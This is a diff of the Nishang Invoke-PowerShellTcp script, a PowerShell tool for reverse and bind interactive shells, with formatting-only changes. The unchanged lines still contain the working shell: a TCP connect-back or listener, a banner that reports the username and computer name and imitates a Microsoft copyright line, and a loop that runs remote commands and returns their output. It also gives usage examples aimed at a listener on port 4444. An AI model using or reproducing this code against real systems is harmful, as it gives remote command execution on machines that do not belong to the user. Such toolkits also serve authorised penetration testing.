@@ -1,8 +1,8 @@
-function Invoke-PowerShellTcp 
+function Invoke-PowerShellTcp
 { 
 <#
 .SYNOPSIS
-Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
 
 .DESCRIPTION
 This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
@@ -19,26 +19,26 @@ The port to connect to when using the -Reverse switch. When using -Bind it is th
 .EXAMPLE
 PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port.
 
 .EXAMPLE
 PS > Invoke-PowerShellTcp -Bind -Port 4444
 
-Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
 
 .EXAMPLE
 PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
 
 Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
+listening on the given IP and port.
 
 .LINK
 http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
 https://github.com/nettitude/powershell/blob/master/powerfun.ps1
 https://github.com/samratashok/nishang
 #>      
-    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+    [CmdletBinding(DefaultParameterSetName="reverse")]
+    Param (
 
         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
         [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
@@ -60,8 +60,7 @@ https://github.com/samratashok/nishang
 
     )
 
-    
-    try 
+    try
     {
         #Connect back if the reverse switch is used.
         if ($Reverse)
@@ -73,12 +72,12 @@ https://github.com/samratashok/nishang
         if ($Bind)
         {
             $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
+            $listener.start()
             $client = $listener.AcceptTcpClient()
-        } 
+        }
 
         $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
+        [byte[]]$bytes = 0..65535 | % {0}
 
         #Send back current username and computername
         $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
@@ -99,7 +98,7 @@ https://github.com/samratashok/nishang
             }
             catch
             {
-                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Warning "Something went wrong with execution of command on the target."
                 Write-Error $_
             }
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
@@ -110,7 +109,7 @@ https://github.com/samratashok/nishang
             #Return the results
             $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
             $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
+            $stream.Flush()
         }
         $client.Close()
         if ($listener)
@@ -124,4 +123,3 @@ https://github.com/samratashok/nishang
         Write-Error $_
     }
 }
-
